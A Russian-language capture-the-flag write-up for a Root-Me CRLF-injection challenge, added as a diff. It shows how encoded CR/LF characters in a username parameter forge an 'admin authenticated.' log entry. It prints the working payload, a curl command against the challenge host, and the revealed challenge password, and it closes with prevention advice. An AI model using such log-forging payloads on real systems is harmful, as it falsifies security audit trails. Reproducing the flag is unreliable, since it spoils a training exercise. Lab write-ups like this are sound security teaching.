@@ -1,0 +1,159 @@
+```markdown
+# Root-Me Writeup: CRLF Injection (Authentication v0.04)
+
+**Платформа:** [Root-Me](https://www.root-me.org/)  
+**Категория:** Web - Server  
+**Уровень:** ⭐⭐ (2/5)  
+**Автор:** g0uZ  
+**Решено:** 22.10.2026
+
+---
+
+## 📋 Описание задания
+
+> *"Injectez des données erronées dans le fichier de journalisation."*  
+> (Внедрите ошибочные данные в файл журналирования)
+
+**Цель:** Получить пароль для валидации задания, манипулируя лог-файлом сервера аутентификации.
+
+---
+
+## 🧠 Теория: что такое CRLF-инъекция
+
+**CRLF** — это пара символов:
+- `CR` (Carriage Return) — `\r` — возврат каретки → URL-код: `%0d`
+- `LF` (Line Feed) — `\n` — перевод строки → URL-код: `%0a`
+
+В HTTP-протоколе именно эта пара (`\r\n`) разделяет заголовки и строки. Если сервер не фильтрует пользовательский ввод, злоумышленник может внедрить эти символы и:
+- Разрывать строки в логах
+- Подделывать HTTP-заголовки (HTTP Response Splitting)
+- Создавать ложные записи в журналах событий
+
+---
+
+## 🔍 Разведка
+
+### 1. Открываем задание
+
+После нажатия **"Démarrer le challenge"** получаем форму аутентификации:
+
+- Поле **Login** (username)
+- Поле **Password**
+- Кнопка **"connect"**
+- Блок **"Журнал аутентификации"** с тремя записями:
+  ```
+  admin failed to authenticate.
+  admin authenticated.
+  guest failed to authenticate.
+  ```
+
+### 2. Анализ формы
+
+Просмотр исходного кода (`Ctrl+U`) показывает:
+
+```html
+<form action="" method="GET">
+  <input type="text" name="username" />
+  <input type="password" name="password" />
+</form>
+```
+
+**Ключевые наблюдения:**
+- Метод отправки — **GET** (параметры в URL)
+- Имя поля — `username`, а не `login`
+- В логе уже есть запись `admin authenticated.` — это то, к чему нужно стремиться
+
+### 3. Тестовый запрос
+
+```bash
+curl "http://challenge01.root-me.org/web-serveur/ch14/?username=test&password=123"
+```
+
+В логе появляется новая строка: `test failed to authenticate.`
+
+**Вывод:** сервер берёт наш `username` и автоматически дописывает к нему хвост: ` failed to authenticate.`
+
+---
+
+## ⚔️ Эксплуатация
+
+### Идея атаки
+
+Нужно внедрить CRLF-символы в параметр `username`, чтобы разорвать строку лога и создать отдельную запись `admin authenticated.` без хвоста `failed to authenticate.`
+
+### Пейлоад
+
+```
+username=admin authenticated.%0d%0aadmin
+```
+
+### Что происходит "под капотом"
+
+1. Сервер получает строку: `admin authenticated.\r\nadmin`
+2. Автоматически добавляет суффикс: `admin authenticated.\r\nadmin failed to authenticate.`
+3. При записи в лог символы `\r\n` разрывают строку на две:
+   ```
+   admin authenticated.          ← наша поддельная запись
+   admin failed to authenticate. ← хвост сервера (ушёл на новую строку)
+   ```
+
+### Выполнение
+
+```bash
+curl "http://challenge01.root-me.org/web-serveur/ch14/?username=admin%20authenticated.%0d%0aadmin&password=test"
+```
+
+### Результат
+
+В логе появляется:
+```
+admin failed to authenticate.
+admin authenticated.
+guest failed to authenticate.
+admin authenticated.        ← наша инъекция
+admin failed to authenticate.
+```
+
+В конце HTML-ответа сервер возвращает:
+
+```html
+<h3>Well done, you can validate challenge with this password : rFSP&G0p&5uAg1%</h3>
+```
+
+---
+
+## 🏁 Флаг
+
+```
+rFSP&G0p&5uAg1%
+```
+
+Вводится в поле **"Entrer le mot de passe"** на странице задания → кнопка **"envoyer"** → задание засчитано ✅
+
+---
+
+## ️ Как предотвратить такую уязвимость
+
+1. **Санитизация ввода** — удалять/экранировать символы `\r` и `\n` из пользовательских данных перед записью в лог
+2. **Структурированное логирование** — использовать JSON-формат логов вместо конкатенации строк
+3. **Валидация на стороне сервера** — не доверять данным из GET/POST параметров
+4. **Принцип наименьших привилегий** — лог-файл должен быть доступен только на запись, а не на исполнение
+
+---
+
+## 📚 Полезные ссылки
+
+- [OWASP: CRLF Injection](https://owasp.org/www-community/vulnerabilities/CRLF_Injection)
+- [RFC 2616 — HTTP/1.1](https://datatracker.ietf.org/doc/html/rfc2616)
+- [Root-Me: Vulnerabilité CRLF](https://www.root-me.org/fr/Challenges/Web-Serveur/CRLF)
+
+---
+
+> 💡 **Вывод:** CRLF-инъекция — классическая уязвимость, которая показывает, почему нельзя слепо конкатенировать пользовательский ввод при записи в логи. Один неотфильтрованный `%0d%0a` может полностью исказить картину событий в журнале безопасности.
+
+---
+
+**Автор writeup:** Руслан  
+**Инструменты:** `curl`, браузер, анализ HTML-кода  
+**Время решения:** ~30 минут
+```
